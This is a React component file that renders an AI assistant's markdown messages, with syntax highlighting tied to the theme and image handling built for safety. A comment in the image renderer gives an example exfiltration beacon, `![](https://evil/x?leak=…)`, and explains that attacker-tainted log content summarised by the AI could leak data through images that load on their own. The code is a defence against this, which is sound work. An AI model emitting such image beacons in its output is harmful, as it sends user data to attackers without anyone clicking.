import { useMemo } from 'react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { PrismAsyncLight as SyntaxHighlighter } from 'react-syntax-highlighter'
import sql from 'react-syntax-highlighter/dist/esm/languages/prism/sql'
import json from 'react-syntax-highlighter/dist/esm/languages/prism/json'
import bash from 'react-syntax-highlighter/dist/esm/languages/prism/bash'
import yaml from 'react-syntax-highlighter/dist/esm/languages/prism/yaml'
import { oneDark, oneLight } from 'react-syntax-highlighter/dist/esm/styles/prism'
import { useTheme } from '../context/ThemeContext'

// Only these grammars are registered; PrismAsyncLight loads them as separate
// lazy chunks. An unknown/absent language (or a partial fence mid-stream)
// renders unhighlighted — never an error.
SyntaxHighlighter.registerLanguage('sql', sql)
SyntaxHighlighter.registerLanguage('json', json)
SyntaxHighlighter.registerLanguage('bash', bash)
SyntaxHighlighter.registerLanguage('yaml', yaml)

// react-markdown v9 removed the `inline` prop: the `code` renderer is called
// for both inline and block code. Treat it as inline only when there is no
// language class AND no newline; everything else is a block (a language-less
// fenced block falls back to the 'text' grammar = no highlighting).
// makeCodeRenderer builds the fenced-code renderer bound to a Prism style, so
// syntax highlighting follows the active theme (oneDark / oneLight, #240).
function makeCodeRenderer(prismStyle) {
  return function code({ className, children }) {
    const match = /language-(\w+)/.exec(className || '')
    const text = String(children ?? '')
    const isInline = !className && !text.includes('\n')
    if (isInline) {
      return (
        <code className="bg-surface-container-high rounded-sm px-1 py-0.5 text-[0.85em] font-mono text-gray-100">
          {children}
        </code>
      )
    }
    const language = match ? match[1] : 'text'
    return (
      <div className="bg-surface-container-high rounded-sm overflow-x-auto my-2">
        <SyntaxHighlighter
          language={language}
          style={prismStyle}
          PreTag="div"
          customStyle={{ margin: 0, background: 'transparent', fontSize: '12px', padding: '10px' }}
          codeTagProps={{ style: { fontFamily: 'inherit', background: 'transparent' } }}
        >
          {text.replace(/\n$/, '')}
        </SyntaxHighlighter>
      </div>
    )
  }
}

const components = {
  a({ href, children }) {
    return (
      <a href={href} className="text-primary hover:underline" target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    )
  },
  // Sentry summarizes content it read from agent/session logs, which may be
  // attacker-tainted. An unrestricted <img> is fetched automatically on render,
  // turning `![](https://evil/x?leak=…)` into a passive exfiltration beacon
  // (no click needed). Only render same-safety https images; anything else
  // (http, data:, protocol-relative, relative) falls back to inert alt text (#237).
  img({ src, alt }) {
    if (typeof src === 'string' && /^https:\/\//i.test(src)) {
      return <img src={src} alt={alt || ''} className="max-w-full rounded-sm my-1" />
    }
    return <span className="text-gray-500 italic">{alt ? `[image: ${alt}]` : '[image]'}</span>
  },
  table({ children }) {
    return (
      <div className="overflow-x-auto my-2">
        <table className="text-xs border-collapse">{children}</table>
      </div>
    )
  },
  th({ children }) {
    return <th className="bg-surface-container-high text-left font-semibold px-2 py-1 text-gray-100">{children}</th>
  },
  td({ children }) {
    return <td className="bg-surface-container px-2 py-1 align-top">{children}</td>
  },
  ul({ children }) {
    return <ul className="list-disc pl-5 my-1 space-y-0.5">{children}</ul>
  },
  ol({ children }) {
    return <ol className="list-decimal pl-5 my-1 space-y-0.5">{children}</ol>
  },
  h1({ children }) {
    return <h1 className="text-base font-semibold mt-2 mb-1">{children}</h1>
  },
  h2({ children }) {
    return <h2 className="text-sm font-semibold mt-2 mb-1">{children}</h2>
  },
  h3({ children }) {
    return <h3 className="text-sm font-semibold mt-1.5 mb-0.5">{children}</h3>
  },
  h4({ children }) {
    return <h4 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mt-1.5 mb-0.5">{children}</h4>
  },
  p({ children }) {
    return <p className="my-1 leading-relaxed">{children}</p>
  },
  blockquote({ children }) {
    return <blockquote className="bg-surface-container-high/50 rounded-sm px-3 py-1 my-1 text-gray-400">{children}</blockquote>
  },
  hr() {
    return <hr className="border-0 h-px bg-surface-container-high my-2" />
  },
}

// Markdown renders an assistant message's raw markdown string, styled to the
// Digital Sentry dark theme. XSS-safe: react-markdown defaults escape raw HTML;
// no rehype-raw / no dangerouslySetInnerHTML.
export default function Markdown({ children }) {
  const { theme } = useTheme()
  const comps = useMemo(
    () => ({ ...components, code: makeCodeRenderer(theme === 'light' ? oneLight : oneDark) }),
    [theme],
  )
  return (
    <div className="text-sm text-gray-100 break-words [&>*:first-child]:mt-0 [&>*:last-child]:mb-0">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={comps}>
        {children || ''}
      </ReactMarkdown>
    </div>
  )
}
